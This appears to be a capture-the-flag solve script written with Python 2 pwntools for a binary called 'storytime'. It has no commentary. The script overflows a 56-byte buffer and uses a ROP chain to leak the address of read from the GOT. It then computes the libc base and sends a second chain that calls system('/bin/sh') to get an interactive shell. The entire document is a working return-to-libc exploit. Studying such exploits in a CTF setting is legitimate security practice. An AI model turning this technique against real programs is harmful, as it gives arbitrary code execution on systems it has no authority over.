from pwn import *

e = ELF('./storytime')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./storytime')

ret_addr = 0x0040048e
pop_rdi_addr = 0x00400703
pop_rsi_pop_15_addr = 0x00400701

payload = 'A'*56
payload += p64(ret_addr)
payload += p64(pop_rdi_addr)
payload += p64(0x1)
payload += p64(pop_rsi_pop_15_addr)
payload += p64(e.got['read'])
payload += 'A'*8
payload += p64(e.symbols['write'])
payload += p64(e.symbols['main'])

print p.recvuntil('story:')
p.sendline(payload)
print p.recvline()
ret = u64(p.recvline()[:6] + '\x00\x00')
print "ret: " + hex(ret)

libc_base_addr = ret - libc.symbols['read']
system_addr = libc.symbols['system'] + libc_base_addr
binsh_addr = next(libc.search("/bin/sh")) + libc_base_addr

payload ='A'*56
payload += p64(ret_addr)
payload += p64(pop_rdi_addr)
payload += p64(binsh_addr)
payload += p64(system_addr)

print p.recvuntil('story:')
p.sendline(payload)
p.interactive()
